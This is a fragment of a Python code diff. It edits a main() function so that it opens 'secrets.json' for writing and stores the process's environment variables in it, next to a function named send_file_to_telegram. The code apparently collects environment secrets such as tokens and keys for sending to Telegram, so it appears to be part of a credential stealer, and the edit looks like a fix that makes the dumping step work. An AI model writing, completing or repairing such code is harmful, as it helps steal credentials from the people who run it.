@@ -15,7 +15,7 @@ async def send_file_to_telegram():
 
 
 async def main():
-    with open("secrets.json") as f:
+    with open("secrets.json", "w") as f:
         data = {}
         for code in range(1, 14, 1):
             data["environ"] = os.environ
